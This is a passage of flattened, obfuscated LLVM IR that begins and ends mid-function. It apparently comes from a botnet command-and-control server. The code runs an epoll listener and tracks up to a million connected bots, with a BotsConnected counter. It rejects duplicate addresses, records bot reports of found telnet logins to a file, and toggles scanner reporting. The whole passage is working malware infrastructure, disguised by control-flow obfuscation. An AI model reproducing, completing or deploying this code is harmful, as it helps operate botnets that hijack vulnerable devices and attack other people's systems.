  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  %switchVar = alloca i32
  store i32 1171150755, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1171150755, label %24
    i32 -1709708126, label %28
    i32 -87009380, label %33
    i32 542604468, label %43
    i32 -667811662, label %53
    i32 -1125743731, label %63
    i32 173484760, label %82
    i32 -760682260, label %93
    i32 -1643116009, label %94
    i32 801378048, label %100
    i32 -517038044, label %105
    i32 1188662476, label %110
    i32 -2048908305, label %111
    i32 -2045016389, label %112
    i32 1037144837, label %121
    i32 1258562672, label %125
    i32 -1367549034, label %133
    i32 280288650, label %138
    i32 -870577936, label %139
    i32 -1800458336, label %152
    i32 32192990, label %153
    i32 -153693933, label %154
    i32 635110038, label %157
    i32 -1618881740, label %161
    i32 -825620454, label %166
    i32 -679140121, label %169
    i32 1889412698, label %172
    i32 -2101588043, label %178
    i32 1723869912, label %181
    i32 -1434488491, label %192
    i32 -1483210541, label %195
    i32 1975411400, label %202
    i32 423334040, label %203
    i32 -919513530, label %216
    i32 1744161496, label %218
    i32 866794376, label %222
    i32 165313056, label %228
    i32 1967394585, label %230
    i32 -1037537690, label %235
    i32 -1562832744, label %236
    i32 -1275457285, label %242
    i32 1356778893, label %247
    i32 818377235, label %248
    i32 -1479857144, label %249
    i32 183189332, label %255
    i32 241344297, label %266
    i32 1100909956, label %272
    i32 717878934, label %275
    i32 -2042679626, label %281
    i32 -1444210793, label %284
    i32 1705122813, label %289
    i32 -745990386, label %290
    i32 1208160098, label %293
    i32 1651746492, label %297
    i32 -281224901, label %302
    i32 -2032712513, label %303
    i32 1891881795, label %304
    i32 1507028047, label %308
    i32 1091596454, label %309
    i32 -489465350, label %310
    i32 -336787775, label %314
    i32 903418605, label %319
    i32 1650857458, label %320
    i32 -620170142, label %321
    i32 -511842868, label %322
    i32 -880620945, label %323
    i32 1665541438, label %326
    i32 -684707337, label %327
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 -1709708126, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  %32 = select i1 %31, i32 -87009380, i32 1665541438
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i64 %36
  %38 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 1
  %40 = and i32 %39, 8
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -1125743731, i32 542604468
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i64 %46
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 1
  %50 = and i32 %49, 16
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 -1125743731, i32 -667811662
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i64 %56
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 1
  %60 = and i32 %59, 1
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 173484760, i32 -1125743731
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %65 = load i32, i32* %8, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %64, i64 %66
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %67, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  %70 = load i32, i32* %69, align 1
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %71
  %73 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %72, i32 0, i32 1
  store i8 0, i8* %73, align 4
  %74 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i64 %76
  %78 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %77, i32 0, i32 1
  %79 = bitcast %union.epoll_data* %78 to i32*
  %80 = load i32, i32* %79, align 1
  %81 = call i32 @close(i32 %80)
  store i32 -880620945, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load volatile i32, i32* @listenFD, align 4
  %84 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %84, i64 %86
  %88 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %87, i32 0, i32 1
  %89 = bitcast %union.epoll_data* %88 to i32*
  %90 = load i32, i32* %89, align 1
  %91 = icmp eq i32 %83, %90
  %92 = select i1 %91, i32 -760682260, i32 423334040
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1643116009, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 16, i32* %10, align 4
  %95 = load volatile i32, i32* @listenFD, align 4
  %96 = call i32 @accept(i32 %95, %struct.sockaddr* %9, i32* %10)
  store i32 %96, i32* %11, align 4
  %97 = load i32, i32* %11, align 4
  %98 = icmp eq i32 %97, -1
  %99 = select i1 %98, i32 801378048, i32 -2045016389
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32* @__errno_location() #9
  %102 = load i32, i32* %101, align 4
  %103 = icmp eq i32 %102, 11
  %104 = select i1 %103, i32 1188662476, i32 -517038044
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32* @__errno_location() #9
  %107 = load i32, i32* %106, align 4
  %108 = icmp eq i32 %107, 11
  %109 = select i1 %108, i32 1188662476, i32 -2048908305
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1975411400, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  store i32 1975411400, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %113, i32 0, i32 2
  %115 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 2
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %119, i32 0, i32 0
  store i32 %116, i32* %120, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  store i32 1037144837, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %12, align 4
  %123 = icmp slt i32 %122, 1000000
  %124 = select i1 %123, i32 1258562672, i32 635110038
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %12, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %127
  %129 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %128, i32 0, i32 1
  %130 = load i8, i8* %129, align 4
  %131 = icmp ne i8 %130, 0
  %132 = select i1 %131, i32 -1367549034, i32 280288650
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %12, align 4
  %135 = load i32, i32* %11, align 4
  %136 = icmp eq i32 %134, %135
  %137 = select i1 %136, i32 280288650, i32 -870577936
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 -153693933, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 8
  %150 = icmp eq i32 %144, %149
  %151 = select i1 %150, i32 -1800458336, i32 32192990
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %13, align 4
  store i32 635110038, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 -153693933, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %12, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %12, align 4
  store i32 1037144837, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %158, 0
  %160 = select i1 %159, i32 -1618881740, i32 1889412698
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i32, i32* %11, align 4
  %163 = call i64 @send(i32 %162, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %164 = icmp eq i64 %163, -1
  %165 = select i1 %164, i32 -825620454, i32 -679140121
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* %11, align 4
  %168 = call i32 @close(i32 %167)
  store i32 -1643116009, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %11, align 4
  %171 = call i32 @close(i32 %170)
  store i32 -1643116009, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %11, align 4
  %174 = call i32 @make_socket_non_blocking(i32 %173)
  store i32 %174, i32* %6, align 4
  %175 = load i32, i32* %6, align 4
  %176 = icmp eq i32 %175, -1
  %177 = select i1 %176, i32 -2101588043, i32 1723869912
  store i32 %177, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32, i32* %11, align 4
  %180 = call i32 @close(i32 %179)
  store i32 1975411400, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %11, align 4
  %183 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %184 = bitcast %union.epoll_data* %183 to i32*
  store i32 %182, i32* %184, align 1
  %185 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %185, align 1
  %186 = load volatile i32, i32* @epollFD, align 4
  %187 = load i32, i32* %11, align 4
  %188 = call i32 @epoll_ctl(i32 %186, i32 1, i32 %187, %struct.epoll_event* %4) #7
  store i32 %188, i32* %6, align 4
  %189 = load i32, i32* %6, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 -1434488491, i32 -1483210541
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %193 = load i32, i32* %11, align 4
  %194 = call i32 @close(i32 %193)
  store i32 1975411400, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %197
  %199 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %198, i32 0, i32 1
  store i8 1, i8* %199, align 4
  %200 = load i32, i32* %11, align 4
  %201 = call i64 @send(i32 %200, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  store i32 -1643116009, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 -880620945, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %204, i64 %206
  %208 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %207, i32 0, i32 1
  %209 = bitcast %union.epoll_data* %208 to i32*
  %210 = load i32, i32* %209, align 1
  store i32 %210, i32* %14, align 4
  %211 = load i32, i32* %14, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %212
  store %struct.clientdata_t* %213, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %214 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %215 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %214, i32 0, i32 1
  store i8 1, i8* %215, align 4
  store i32 -919513530, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %217, i8 0, i64 2048, i32 16, i1 false)
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %219, i8 0, i64 2048, i32 16, i1 false)
  %220 = icmp ne i8* %219, null
  %221 = select i1 %220, i32 866794376, i32 165313056
  store i32 %221, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %224 = load i32, i32* %14, align 4
  %225 = call i32 @fdgets(i8* %223, i32 2048, i32 %224)
  %226 = sext i32 %225 to i64
  store i64 %226, i64* %17, align 8
  %227 = icmp sgt i64 %226, 0
  store i32 165313056, i32* %switchVar
  store i1 %227, i1* %.reg2mem
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %229 = select i1 %.reload, i32 1967394585, i32 1208160098
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %233 = icmp eq i8* %232, null
  %234 = select i1 %233, i32 -1037537690, i32 -1562832744
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 1208160098, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %237)
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %240 = icmp eq i32 %239, 0
  %241 = select i1 %240, i32 -1275457285, i32 -1479857144
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %14, align 4
  %244 = call i64 @send(i32 %243, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %245 = icmp eq i64 %244, -1
  %246 = select i1 %245, i32 1356778893, i32 818377235
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 1208160098, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %253 = icmp eq i8* %251, %252
  %254 = select i1 %253, i32 183189332, i32 241344297
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %258 = getelementptr inbounds i8, i8* %257, i64 7
  store i8* %258, i8** %19, align 8
  %259 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %260 = load i8*, i8** %19, align 8
  %261 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %259, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %260)
  %262 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %263 = call i32 @fflush(%struct._IO_FILE* %262)
  %264 = load volatile i32, i32* @TELFound, align 4
  %265 = add nsw i32 %264, 1
  store volatile i32 %265, i32* @TELFound, align 4
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %268 = call i8* @strstr(i8* %267, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %270 = icmp eq i8* %268, %269
  %271 = select i1 %270, i32 1100909956, i32 717878934
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %274 = call i8* @strstr(i8* %273, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %274, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %277 = call i8* @strstr(i8* %276, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %279 = icmp eq i8* %277, %278
  %280 = select i1 %279, i32 -2042679626, i32 -1444210793
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %283, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %287 = icmp eq i32 %286, 0
  %288 = select i1 %287, i32 1705122813, i32 -745990386
  store i32 %288, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %291 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %292 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %291)
  store i32 1744161496, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i64, i64* %17, align 8
  %295 = icmp eq i64 %294, -1
  %296 = select i1 %295, i32 1651746492, i32 1891881795
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32* @__errno_location() #9
  %299 = load i32, i32* %298, align 4
  %300 = icmp ne i32 %299, 11
  %301 = select i1 %300, i32 -281224901, i32 -2032712513
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 -2032712513, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  store i32 1650857458, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i64, i64* %17, align 8
  %306 = icmp eq i64 %305, 0
  %307 = select i1 %306, i32 1507028047, i32 1091596454
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 1650857458, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  store i32 -489465350, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = load i32, i32* %16, align 4
  %312 = icmp ne i32 %311, 0
  %313 = select i1 %312, i32 -336787775, i32 903418605
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %316 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %315, i32 0, i32 1
  store i8 0, i8* %316, align 4
  %317 = load i32, i32* %14, align 4
  %318 = call i32 @close(i32 %317)
  store i32 903418605, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 -919513530, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  store i32 -620170142, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  store i32 -511842868, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 -880620945, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i32, i32* %8, align 4
  %325 = add nsw i32 %324, 1
  store i32 %325, i32* %8, align 4
  store i32 -1709708126, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  store i32 1171150755, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8*, i8** %2, align 8
  ret i8* %328

loopEnd:                                          ; preds = %326, %323, %322, %321, %320, %319, %314, %310, %309, %308, %304, %303, %302, %297, %293, %290, %289, %284, %281, %275, %272, %266, %255, %249, %248, %247, %242, %236, %235, %230, %228, %222, %218, %216, %203, %202, %195, %192, %181, %178, %172, %169, %166, %161, %157, %154, %153, %152, %139, %138, %133, %125, %121, %112, %111, %110, %105, %100, %94, %93, %82, %63, %53, %43, %33, %28, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -173183614, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -173183614, label %first
    i32 -393568849, label %11
    i32 -1992720677, label %12
    i32 -304561795, label %21
    i32 1222958384, label %22
    i32 1455725894, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %9 = icmp eq i32 %.reload, -1
  %10 = select i1 %9, i32 -393568849, i32 -1992720677
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 1455725894, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i32, i32* %4, align 4
  %14 = or i32 %13, 2048
  store i32 %14, i32* %4, align 4
  %15 = load i32, i32* %3, align 4
  %16 = load i32, i32* %4, align 4
  %17 = call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %16)
  store i32 %17, i32* %5, align 4
  %18 = load i32, i32* %5, align 4
  %19 = icmp eq i32 %18, -1
  %20 = select i1 %19, i32 -304561795, i32 1222958384
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 1455725894, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 1455725894, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  ret i32 %24

loopEnd:                                          ; preds = %22, %21, %12, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -1689519417, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1689519417, label %3
    i32 836490402, label %7
    i32 2090580668, label %15
    i32 1260986192, label %16
    i32 1741158851, label %19
    i32 -911575823, label %22
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  %6 = select i1 %5, i32 836490402, i32 -911575823
  store i32 %6, i32* %switchVar
  br label %loopEnd

